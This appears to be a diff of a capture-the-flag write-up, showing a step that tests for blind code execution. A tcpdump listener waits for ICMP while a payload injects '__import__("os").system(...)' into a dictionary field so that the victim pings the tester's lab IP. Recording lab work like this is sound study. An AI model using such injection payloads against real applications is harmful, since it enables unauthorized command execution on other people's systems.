@@ -76,6 +76,7 @@ That works too, however there is no result returned when it is tried on the vict
 
 Test 3: Ping from victim to local machine:
 tcpdump -i tun0 -nnv icmp
+
 Payload (test.py): 
 ```brew_dict['abv'] = '__import__("os").system("ping -c 3 10.10.14.4")' ```
  
